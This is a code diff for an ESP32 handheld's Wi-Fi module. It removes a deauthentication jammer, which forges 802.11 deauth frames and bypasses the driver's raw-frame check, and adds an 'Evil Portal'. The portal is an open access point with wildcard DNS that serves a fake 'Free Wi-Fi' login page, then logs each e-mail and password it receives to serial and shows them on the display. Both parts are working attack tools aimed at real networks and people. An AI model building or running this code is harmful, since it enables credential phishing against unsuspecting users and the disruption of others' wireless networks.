@@ -1,69 +1,54 @@
 #pragma once
 #include <M5Cardputer.h>
 #include <WiFi.h>
-#include <esp_wifi.h>
-#include "esp_system.h"
+#include <WebServer.h>
+#include <DNSServer.h>
 #include "../main_menu.h"
-
-extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    if (arg == 31337) {
-        return 1;
-    }
-    return 0;
-}
 
 class WifiModule {
 public:
-    static constexpr int MAX_APS = 24;
-
-    struct ApEntry {
-        char ssid[33];
-        uint8_t bssid[6];
-        int32_t rssi;
-        uint8_t channel;
-    };
+    static constexpr uint8_t DNS_PORT = 53;
 
     void enter() {
-        jamming_ = false;
-        deauthApStarted_ = false;
-        selectedIdx_ = 0;
-        apCount_ = 0;
-        deauthFrameCount_ = 0;
-        scanNetworks();
+        portalRunning_ = false;
+        selectedItem_ = 0;
+        hasSubmitted_ = false;
+        lastEmail_[0] = '\0';
+        lastPass_[0] = '\0';
         draw();
     }
 
     bool update(const NavInput& nav) {
-        if (nav.back) {
-            stopJamming();
-            return true;
-        }
+        if (portalRunning_) {
+            dnsServer_.processNextRequest();
+            webServer_.handleClient();
 
-        if (jamming_) {
-            if (nav.select) {
-                stopJamming();
+            if (nav.back) {
+                stopPortal();
                 draw();
-            } else {
-                stepJam();
+                return false;
+            }
+
+            if (nav.select) {
+                hasSubmitted_ = false;
+                lastEmail_[0] = '\0';
+                lastPass_[0] = '\0';
+                draw();
             }
             return false;
         }
 
-        if (apCount_ > 0) {
-            if (nav.up) {
-                selectedIdx_ = (selectedIdx_ - 1 + apCount_) % apCount_;
-                draw();
-            }
-            if (nav.down) {
-                selectedIdx_ = (selectedIdx_ + 1) % apCount_;
-                draw();
-            }
-            if (nav.select) {
-                startJamming();
-                draw();
-            }
-        } else if (nav.select) {
-            scanNetworks();
+        if (nav.back) {
+            return true;
+        }
+
+        if (nav.up || nav.down) {
+            selectedItem_ = 0;
+            draw();
+        }
+
+        if (nav.select && selectedItem_ == 0) {
+            startPortal();
             draw();
         }
 
@@ -71,127 +56,110 @@ public:
     }
 
 private:
-    ApEntry aps_[MAX_APS];
-    int apCount_ = 0;
-    int selectedIdx_ = 0;
-    bool jamming_ = false;
-    bool deauthApStarted_ = false;
+    static constexpr const char* PORTAL_SSID = "wifi";
 
-    uint8_t deauthFrame_[26];
-    uint8_t targetBSSID_[6];
-    int targetChannel_ = 1;
-    unsigned long deauthLastSend_ = 0;
-    unsigned long deauthLastDisplay_ = 0;
-    uint32_t deauthFrameCount_ = 0;
+    int selectedItem_ = 0;
+    bool portalRunning_ = false;
+    bool hasSubmitted_ = false;
+    char lastEmail_[64] = "";
+    char lastPass_[64] = "";
 
-    void scanNetworks() {
-        auto& d = M5Cardputer.Display;
-        d.fillScreen(THEME_BG);
-        d.setTextColor(THEME_FG, THEME_BG);
-        d.setTextSize(2);
-        d.setCursor(12, 48);
-        d.print("Scanning Wi-Fi...");
+    DNSServer dnsServer_;
+    WebServer webServer_{80};
 
-        WiFi.mode(WIFI_STA);
-        WiFi.disconnect(false, true);
-        delay(80);
-
-        int found = WiFi.scanNetworks(false, true);
-        apCount_ = (found > MAX_APS) ? MAX_APS : ((found > 0) ? found : 0);
-        selectedIdx_ = 0;
-
-        for (int i = 0; i < apCount_; ++i) {
-            String s = WiFi.SSID(i);
-            if (s.length() == 0) {
-                snprintf(aps_[i].ssid, sizeof(aps_[i].ssid), "<Hidden>");
-            } else {
-                s.toCharArray(aps_[i].ssid, sizeof(aps_[i].ssid));
-            }
-
-            uint8_t* mac = WiFi.BSSID(static_cast<uint8_t>(i));
-            if (mac) {
-                memcpy(aps_[i].bssid, mac, 6);
-            } else {
-                memset(aps_[i].bssid, 0xFF, 6);
-            }
-
-            aps_[i].rssi = WiFi.RSSI(static_cast<uint8_t>(i));
-            aps_[i].channel = static_cast<uint8_t>(WiFi.channel(static_cast<uint8_t>(i)));
-        }
-
-        WiFi.scanDelete();
+    static const char* portalHtml() {
+        return R"HTML(
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Free Wi-Fi</title>
+  <style>
+    body{font-family:Arial,sans-serif;background:#121212;color:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
+    .card{background:#1e1e1e;padding:24px;border-radius:10px;width:90%;max-width:340px;box-sizing:border-box}
+    h2{margin:0 0 6px;color:#ffd400;font-size:22px}
+    p{margin:0 0 16px;color:#cccccc;font-size:14px}
+    label{display:block;font-size:13px;margin-bottom:4px;color:#dddddd}
+    input{width:100%;padding:10px;margin-bottom:12px;border:1px solid #444;border-radius:6px;background:#121212;color:#ffffff;box-sizing:border-box}
+    button{width:100%;padding:11px;border:none;border-radius:6px;background:#ffd400;color:#121212;font-weight:bold;font-size:15px;cursor:pointer}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Free Wi-Fi</h2>
+    <p>Enter your e-mail and password to connect.</p>
+    <form method="POST" action="/connect">
+      <label for="email">E-mail</label>
+      <input id="email" type="email" name="email" placeholder="name@example.com" required>
+      <label for="pass">Password</label>
+      <input id="pass" type="password" name="pass" placeholder="Password" required>
+      <button type="submit">Connect</button>
+    </form>
+  </div>
+</body>
+</html>
+)HTML";
     }
 
-    void startJamming() {
-        if (apCount_ <= 0) return;
-        const ApEntry& target = aps_[selectedIdx_];
+    void handleRoot() {
+        webServer_.send(200, "text/html", portalHtml());
+    }
 
-        memcpy(targetBSSID_, target.bssid, 6);
-        targetChannel_ = target.channel;
+    void handleConnect() {
+        String email = webServer_.arg("email");
+        String pass = webServer_.arg("pass");
 
-        WiFi.disconnect();
-        delay(50);
+        email.toCharArray(lastEmail_, sizeof(lastEmail_));
+        pass.toCharArray(lastPass_, sizeof(lastPass_));
+        hasSubmitted_ = (email.length() > 0 && pass.length() > 0);
+
+        Serial.printf("email : %s\npass: %s\n", lastEmail_, lastPass_);
+
+        webServer_.send(200, "text/html",
+                        "<!DOCTYPE html><html><body style='font-family:Arial,sans-serif;background:#121212;color:#f5f5f5;text-align:center;padding-top:60px'>"
+                        "<h2>Connecting to Free Wi-Fi...</h2><p>Please wait.</p></body></html>");
+
+        if (portalRunning_) {
+            draw();
+        }
+    }
+
+    void startPortal() {
+        stopPortal();
+
+        hasSubmitted_ = false;
+        lastEmail_[0] = '\0';
+        lastPass_[0] = '\0';
+
+        WiFi.disconnect(false, true);
         WiFi.mode(WIFI_AP);
+        delay(50);
+
+        IPAddress apIp(192, 168, 4, 1);
+        IPAddress netMask(255, 255, 255, 0);
+        WiFi.softAPConfig(apIp, apIp, netMask);
+        WiFi.softAP(PORTAL_SSID, nullptr, 1, 0, 4);
         delay(100);
 
-        String apSsid = "Medusa_" + String(random(1000, 9999));
-        bool ok = WiFi.softAP(apSsid.c_str(), nullptr, targetChannel_, 0, 4, false);
-        delay(150);
-        if (!ok) {
-            WiFi.mode(WIFI_OFF);
-            jamming_ = false;
-            deauthApStarted_ = false;
-            return;
-        }
+        dnsServer_.setErrorReplyCode(DNSReplyCode::NoError);
+        dnsServer_.start(DNS_PORT, "*", apIp);
 
-        esp_wifi_set_channel(targetChannel_, WIFI_SECOND_CHAN_NONE);
-        delay(50);
+        webServer_.on("/", HTTP_GET, [this]() { handleRoot(); });
+        webServer_.on("/connect", HTTP_POST, [this]() { handleConnect(); });
+        webServer_.onNotFound([this]() { handleRoot(); });
+        webServer_.begin();
 
-        memset(deauthFrame_, 0, sizeof(deauthFrame_));
-        deauthFrame_[0] = 0xC0; deauthFrame_[1] = 0x00;
-        deauthFrame_[2] = 0x3A; deauthFrame_[3] = 0x01;
-        memset(&deauthFrame_[4], 0xFF, 6);
-        memcpy(&deauthFrame_[10], targetBSSID_, 6);
-        memcpy(&deauthFrame_[16], targetBSSID_, 6);
-        deauthFrame_[24] = 0x07;
-        deauthFrame_[25] = 0x00;
-
-        jamming_ = true;
-        deauthApStarted_ = true;
-        deauthFrameCount_ = 0;
-        deauthLastSend_ = 0;
-        deauthLastDisplay_ = 0;
+        portalRunning_ = true;
     }
 
-    void stopJamming() {
-        if (!jamming_ && !deauthApStarted_) return;
-        jamming_ = false;
-        if (deauthApStarted_) {
-            WiFi.softAPdisconnect(true);
-            deauthApStarted_ = false;
-        }
-        WiFi.mode(WIFI_OFF);
-        delay(50);
-    }
-
-    void stepJam() {
-        if (!jamming_ || apCount_ <= 0) return;
-        if (millis() - deauthLastSend_ < 5) return;
-        deauthLastSend_ = millis();
-
-        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame_, sizeof(deauthFrame_), false);
-        if (err == ESP_OK) deauthFrameCount_++;
-
-        if (millis() - deauthLastDisplay_ > 500) {
-            deauthLastDisplay_ = millis();
-            auto& d = M5Cardputer.Display;
-            d.setTextSize(1);
-            d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
-            d.setCursor(16, 86);
-            d.printf("Frames: %lu  Ch: %d   ",
-                     static_cast<unsigned long>(deauthFrameCount_),
-                     targetChannel_);
-        }
+    void stopPortal() {
+        if (!portalRunning_) return;
+        portalRunning_ = false;
+        webServer_.stop();
+        dnsServer_.stop();
+        WiFi.softAPdisconnect(true);
+        WiFi.mode(WIFI_STA);
     }
 
     void draw() {
@@ -199,75 +167,51 @@ private:
         d.fillScreen(THEME_BG);
         d.setTextColor(THEME_FG, THEME_BG);
 
-        if (apCount_ == 0) {
+        if (!portalRunning_) {
             d.setTextSize(2);
-            d.setCursor(12, 24);
-            d.print("No Wi-Fi found");
-            d.setTextSize(1);
-            d.setCursor(12, 60);
-            d.print("Enter: Rescan | `/Bksp: Back");
-            return;
-        }
+            d.setCursor(12, 12);
+            d.print("WI-FI");
 
-        if (jamming_) {
-            const ApEntry& ap = aps_[selectedIdx_];
-            d.fillRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_HIGHLIGHT);
-            d.drawRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_BORDER);
+            d.fillRoundRect(8, 44, d.width() - 16, 30, 4, THEME_HIGHLIGHT);
+            d.drawRoundRect(8, 44, d.width() - 16, 30, 4, THEME_BORDER);
             d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
-
-            d.setTextSize(2);
-            d.setCursor(16, 16);
-            d.print("JAMMING ACTIVE");
-
-            d.setCursor(16, 44);
-            d.printf("%.14s", ap.ssid);
+            d.setCursor(14, 51);
+            d.print("> Evil Portal");
 
             d.setTextSize(1);
-            d.setCursor(16, 70);
-            d.printf("CH: %d  RSSI: %ld dBm", ap.channel, static_cast<long>(ap.rssi));
-
-            d.setCursor(16, 86);
-            d.printf("Frames: %lu  Ch: %d",
-                     static_cast<unsigned long>(deauthFrameCount_),
-                     targetChannel_);
-
-            d.setCursor(16, 108);
-            d.print("Enter: Stop Jam | `/Bksp: Back");
+            d.setTextColor(THEME_FG, THEME_BG);
+            d.setCursor(12, 118);
+            d.print("Enter: Start | `/Bksp: Back");
             return;
         }
 
-        const int visibleRows = 4;
-        int startIdx = 0;
-        if (selectedIdx_ >= visibleRows) {
-            startIdx = selectedIdx_ - visibleRows + 1;
-        }
+        d.fillRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_HIGHLIGHT);
+        d.drawRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_BORDER);
+        d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
 
         d.setTextSize(2);
-        for (int row = 0; row < visibleRows; ++row) {
-            int idx = startIdx + row;
-            if (idx >= apCount_) break;
-
-            int y = 6 + row * 28;
-            bool sel = (idx == selectedIdx_);
-
-            if (sel) {
-                d.fillRoundRect(8, y, d.width() - 16, 25, 4, THEME_HIGHLIGHT);
-                d.drawRoundRect(8, y, d.width() - 16, 25, 4, THEME_BORDER);
-                d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
-            } else {
-                d.setTextColor(THEME_FG, THEME_BG);
-            }
-
-            d.setCursor(12, y + 5);
-            d.print(sel ? "> " : "  ");
-            d.printf("%.13s", aps_[idx].ssid);
-        }
+        d.setCursor(16, 15);
+        d.print("EVIL PORTAL");
 
         d.setTextSize(1);
-        d.setTextColor(THEME_FG, THEME_BG);
-        d.setCursor(10, 122);
-        d.printf("CH:%d %lddBm | Enter:Jam `/Bksp:Back",
-                 aps_[selectedIdx_].channel,
-                 static_cast<long>(aps_[selectedIdx_].rssi));
+        d.setCursor(16, 40);
+        d.print("SSID: wifi | 192.168.4.1");
+
+        if (hasSubmitted_) {
+            d.setCursor(16, 60);
+            d.printf("email : %.24s", lastEmail_);
+
+            d.setCursor(16, 76);
+            d.printf("pass: %.24s", lastPass_);
+        } else {
+            d.setCursor(16, 60);
+            d.print("email : -");
+
+            d.setCursor(16, 76);
+            d.print("pass: -");
+        }
+
+        d.setCursor(16, 108);
+        d.print("Enter: Clear | `/Bksp: Stop");
     }
 };
